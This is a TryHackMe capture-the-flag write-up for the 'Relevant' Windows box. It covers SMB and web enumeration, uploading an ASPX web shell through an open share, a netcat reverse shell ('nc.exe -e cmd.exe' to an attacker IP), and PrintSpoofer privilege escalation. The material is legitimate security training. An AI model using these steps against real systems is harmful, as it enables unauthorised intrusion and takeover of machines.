---
description: Relevant box from TryHackMe! write up.
---

# Relevant

[Link to the room](https://tryhackme.com/room/relevant)

## Enumeration

### Lets start with nmap and threader3000

I will use `threader300` to check all open ports before running `nmap` to reduce scan times:
```
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: <MACHINE_IP>
------------------------------------------------------------
Scanning target <MACHINE_IP>
Time started: 2021-05-07 13:03:58.365964
------------------------------------------------------------
Port 139 is open
Port 80 is open
Port 135 is open
Port 445 is open
Port 3389 is open
Port 49663 is open
Port 49667 is open
Port 49669 is open
Port scan completed in 0:01:39.791011
```

```
nmap -sV -sC -p139,80,135,445,3389,49663,49667,49669 -oN nmapScan.txt <MACHINE_IP>

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 13:07 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.20s latency).

PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-05-07T17:09:00+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-05-06T16:58:58
|_Not valid after:  2021-11-05T16:58:58
|_ssl-date: 2021-05-07T17:09:40+00:00; +1s from scanner time.
49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-07T10:09:02-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-07T17:09:03
|_  start_date: 2021-05-07T16:59:34

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.79 seconds
```

So `RDP` server, 2 web servers and `SMB`. The `RDP` server looks like is protected with a password and both web server looks like the default page of ISS (`TRACE` method allowed but not much more), so lets check `SMB`

### SMB

I will use `enum4linux` to enum the service to get additional information to the already gathered by `nmap`:
```
enum4linux -a -u guest -w WORKGROUP <MACHINE_IP>                      255 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May  7 12:09:27 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... <MACHINE_IP>
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on <MACHINE_IP>    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for <MACHINE_IP>    |
 ============================================= 
Looking up status of <MACHINE_IP>
No reply from <MACHINE_IP>

 ====================================== 
|    Session Check on <MACHINE_IP>    |
 ====================================== 
[+] Server <MACHINE_IP> allows sessions using username 'guest', password ''

 ============================================ 
|    Getting domain SID for <MACHINE_IP>    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on <MACHINE_IP>    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for <MACHINE_IP> from smbclient: 
[+] Got OS info for <MACHINE_IP> from srvinfo:
	<MACHINE_IP>  Wk Sv NT SNT         
	platform_id     :	500
	os version      :	10.0
	server type     :	0x9003

 ========================================== 
|    Share Enumeration on <MACHINE_IP>    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on <MACHINE_IP>
//<MACHINE_IP>/ADMIN$	Mapping: DENIED, Listing: N/A
//<MACHINE_IP>/C$	Mapping: DENIED, Listing: N/A
//<MACHINE_IP>/IPC$	[E] Can't understand response:
NT_STATUS_INVALID_INFO_CLASS listing \*
//<MACHINE_IP>/nt4wrksv	Mapping: OK, Listing: OK

 ===================================================== 
|    Password Policy Information for <MACHINE_IP>    |
 ===================================================== 
[E] Unexpected error from polenum:


[+] Attaching to <MACHINE_IP> using guest

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:<MACHINE_IP>)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: rpc_s_access_denied


[E] Failed to get password policy with rpcclient


 =============================== 
|    Groups on <MACHINE_IP>    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on <MACHINE_IP> via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-5-21-3981879597-1135670737-2718083060
[I] Found new SID: S-1-5-82-3876422241-1344743610-1729199087-774402673
[I] Found new SID: S-1-5-82-3006700770-424185619-1745488364-794895919
[I] Found new SID: S-1-5-82-271721585-897601226-2024613209-625570482
[I] Found new SID: S-1-5-82-2094419441-2301267808-272098454-1219398644
[I] Found new SID: S-1-5-80-3139157870-2983391045-3678747466-658725712
[I] Found new SID: S-1-5-80
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username 'guest', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
```

Lets check that `nt4wrksv` share: `smbclient -N //<MACHINE_IP>/nt4wrksv`. Once connected i found a file called `passwords.txt` cool:
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Looks like `base64` lets get them in clear:

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

I tried the passwords but no luck, maybe they are valid usernames but the passwords are useless, lets check the web page.

### http://MACHINE_IP/

`gobuster` couldn't find anything and `nikto` only reported the `TRACE` method i commented earlier as something "interesting" so lets check the other page.

### http://MACHINE_IP:49663/

`nikto` only reported the `TRACE` method again but `gobuster` reported `/nt4wrksv` path, the same as the SMB share. Maybe it is connected to it? I tried the path `/nt4wrksv/passwords.txt` and the page showed the file content, ok nice.

## Exploiting

### RCE

We have access to that share so... can we get a RCE? I uploaded `cmdasp.aspx` and there it was, allowing me to execete commands nice.

Now i will try to upload `nc.exe` to the share and get a proper reverse shell.

### Reverse shell!

First i had to find the directory, i was pretty lucky i found it fast:
```
dir C:\inetpub\wwwroot\nt4wrksv
```
There it is, nc.exe. Lest try `nc.exe -e cmd.exe <Attacker_IP> <PORT>` with a netcat listener in our site. After some try and error i tried with the port 443 to avoid possible firewalls aaaand the shell came back cool.

#### User flag

The user flag was in Bob directory. Just execute `more C:\Users\Bob\Desktop\user.txt`:
```
THM{*******************************}
```
## Privesc

I tried to execute `winpeas` to check for privesc vectors but to be honest wasn't a good idea. I don't know why but this box is really slow sometimes and it hanged. Sooo i tried some manual enumeration:

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled <----
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

That `SeImpersonatePrivilege` thing looks interesting, after searching a bit i found this exploit: https://github.com/itm4n/PrintSpoofer. I uploaded it to the machine and executed it:

```
C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

And yep, an Administrator shell cool.

### Root flag

Just execute `more C:\Users\Administrator\Desktop\root.txt`:
```
THM{*******************************} 
